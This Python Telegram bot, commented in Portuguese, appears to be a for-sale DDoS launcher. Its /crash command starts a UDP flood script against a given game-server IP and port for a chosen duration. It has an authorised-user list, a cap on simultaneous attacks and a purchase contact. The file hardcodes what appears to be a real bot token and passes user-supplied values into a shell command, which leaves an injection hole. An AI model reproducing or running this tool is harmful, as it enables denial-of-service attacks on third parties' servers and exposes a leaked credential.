import telebot
import subprocess
import re
import time

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}  # Dicionário para armazenar os processos de ataque
authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para validar o formato de IP e Porta
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

# Função para executar o comando do ataque
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))  # Aguarda o tempo do ataque
        processo.terminate()  # Termina o processo após o tempo especificado
        del processos[ip_porta]  # Remove o processo da lista
    except Exception as e:
        print(f"Erro ao executar o comando: {str(e)}")

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]  # Pega o primeiro processo
        oldest_process.terminate()  # Termina o processo mais antigo
        del processos[list(processos.keys())[0]]  # Remove da lista de processos

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "🚀 Bem-vindo ao bot!\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "🔹 **Comandos básicos**:\n"
        "/crash IP:PORTA <threads> <tempo> - Inicia um ataque no IP da partida 🕹️💥\n"
        "/meuid - Mostra seu ID de usuário 👤\n\n"
        "🔸 **Comandos para adicionar ou remover usuários**:\n"
        "/adduser <ID> - Adiciona um usuário autorizado (Somente o dono pode) ✅\n"
        "/removeuser <ID> - Remove um usuário autorizado (Somente o dono pode) ❌\n\n"
        "💬 **Comando para comprar o bot**:\n"
        "/comprarbot - Entre em contato para adquirir o bot 🛒"
    )
    bot.send_message(message.chat.id, welcome_text)

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash(message):
    if message.from_user.id not in authorized_users:
        bot.send_message(message.chat.id, "🚫 Você não está autorizado a usar este comando.")
        return
    
    comando = message.text.split()
    if len(comando) < 2:  # Caso não envie IP:PORTA nem parâmetros extras
        bot.send_message(message.chat.id, "⚠️ Uso correto: /crash <IP:PORTA> <threads> <tempo>")
        return

    ip_porta = comando[1]
    threads = "10"  # Valor padrão para threads
    tempo = "900"  # Valor padrão para tempo

    # Verifica se o usuário passou tempo como argumento
    if len(comando) >= 3:
        tempo = comando[2]
    
    # Verifica se o usuário passou threads como argumento
    if len(comando) >= 4:
        threads = comando[3]
    
    # Verifica e valida o formato de IP:PORTA
    if not validar_ip_porta(ip_porta):
        bot.send_message(message.chat.id, "⚠️ Formato de IP ou porta inválido.")
        return

    manage_attacks()  # Gerencia os ataques simultâneos
    executar_comando(ip_porta, threads, tempo)  # Executa o comando de ataque
    bot.send_message(
        message.chat.id,
        f"💥 **Iniciando ataque** ao IP: {ip_porta} 🕹️\n"
        f"🔹 **Threads**: {threads}\n"
        f"⏳ **Tempo**: {tempo} segundos\n"
        "⚡ Ataque iniciado com sucesso! ⚡"
    )

# Comando /adduser
@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "🚫 Apenas o dono pode adicionar usuários.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "⚠️ Uso correto: /adduser <ID>")
        return

    user_id = int(comando[1])
    if user_id not in authorized_users:
        authorized_users.append(user_id)
        bot.send_message(message.chat.id, f"✅ O usuário {user_id} foi adicionado à lista de autorizados.")
    else:
        bot.send_message(message.chat.id, f"⚠️ O usuário {user_id} já está na lista de autorizados.")

# Comando /removeuser
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "🚫 Apenas o dono pode remover usuários.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "⚠️ Uso correto: /removeuser <ID>")
        return

    user_id = int(comando[1])
    if user_id in authorized_users:
        authorized_users.remove(user_id)
        bot.send_message(message.chat.id, f"❌ O usuário {user_id} foi removido da lista de autorizados.")
    else:
        bot.send_message(message.chat.id, f"⚠️ O usuário {user_id} não está na lista de autorizados.")

# Comando /comprarbot
@bot.message_handler(commands=['comprarbot'])
def comprar_bot(message):
    bot.send_message(message.chat.id, "💬 Entre em contato para adquirir o bot: https://t.me/werbert_ofc 🛒")

# Função para manter o bot ativo (reconectar automaticamente em caso de falhas)
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)  # Espera 15 segundos antes de tentar reconectar

# Iniciar o bot
if __name__ == "__main__":
    keep_alive()